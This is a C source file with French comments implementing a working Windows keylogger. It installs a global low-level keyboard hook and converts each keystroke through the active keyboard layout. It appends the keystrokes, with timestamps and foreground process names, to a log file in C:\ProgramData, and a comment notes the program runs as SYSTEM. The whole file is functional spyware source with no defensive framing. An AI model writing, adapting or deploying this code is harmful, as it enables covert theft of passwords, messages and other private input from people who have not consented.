#include <windows.h>
#include <stdio.h>

HWND lastWindow = NULL;

char *get_clean_process_name(const char* full_path) {
    const char* last_backslash = strrchr(full_path, '\\');
    if (last_backslash) {
        return (char*)(last_backslash + 1);
    }
    return (char*)full_path; 
}

void LogKey(const char* keyOutput) {
    // Ouvert en mode "append" (ajout à la fin). 
    // Chemin absolu car exécuté par SYSTEM sans dossier de travail prévisible.
    // Mais du coup il faut que le fichier existe deja ? TODO
    FILE* file = fopen("C:\\ProgramData\\winkey.log", "a");
    if (!file) return;

    HWND currentWindow = GetForegroundWindow();
    // Ne logger le nom du processus et l'heure que si on change de fenêtre
    if (currentWindow != lastWindow) {
        lastWindow = currentWindow;
        
        DWORD processId;
        GetWindowThreadProcessId(currentWindow, &processId);
        
        char full_name[MAX_PATH] = "Could not get process name";
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        if (hProcess) {
            DWORD size = MAX_PATH;
            QueryFullProcessImageNameA(hProcess, 0, full_name, &size);
            CloseHandle(hProcess);
        }
        
        SYSTEMTIME time;
        GetLocalTime(&time);
        char* clean_name = get_clean_process_name(full_name);
        // On rajoute l'en-tête avec Processus + Timestamp
        fprintf(file, "\n\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\n", 
                time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, clean_name);
    }
    
    fprintf(file, "%s", keyOutput);
    fclose(file);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HC_ACTION)
        return CallNextHookEx(NULL, nCode, wParam, lParam);
 
    KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
    // On préfère LOG sur KEYDOWN pour avoir une meilleure réactivité
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        DWORD vkCode = pKeyboard->vkCode;

        // 1. Touches spéciales "Human Readable"
        if (vkCode == VK_RETURN) LogKey(" [ENTER]\n");
        else if (vkCode == VK_BACK) LogKey(" [BACKSPACE] ");
        else if (vkCode == VK_TAB) LogKey(" [TAB] ");
        else if (vkCode == VK_SPACE) LogKey(" ");
        else if (vkCode >= VK_LSHIFT && vkCode <= VK_RMENU) {} // On ignore le log direct de Shift/Ctrl/Alt
        else {
            // 2. Gestion de la Locale (ex: AZERTY, majuscules...)
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            // MAJ de l'état des modificateurs spécifiques pour le hook global
            keyboardState[VK_SHIFT] = (BYTE)(GetKeyState(VK_SHIFT) & 0x8000);
            keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);
            keyboardState[VK_CONTROL] = (BYTE)(GetKeyState(VK_CONTROL) & 0x8000);
            keyboardState[VK_MENU] = (BYTE)(GetKeyState(VK_MENU) & 0x8000);

            // Récupération de la locale du processus au premier plan
            HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
            
            WCHAR unicodeBuffer[5] = {0};
            int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
            
            if (result > 0) {
                char utf8Buffer[16] = {0};
                WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
                LogKey(utf8Buffer);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {
    // 1. Empêcher l'exécution multiple du Keylogger
    HANDLE handle_mutex = CreateMutex(NULL, TRUE, "keylogger_mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {

        return 1;
    }

    printf("Keylogger started !\n");
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0); // WH_KEYBOARD_LL pour un hook global, NULL pour le module actuel, 0 pour tous les threads
    if (hHook == NULL) {
        printf("Failed to set hook: %ld\n", GetLastError());
        ReleaseMutex(handle_mutex);
        return 1;
    }  
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseMutex(handle_mutex);
    return 0;
}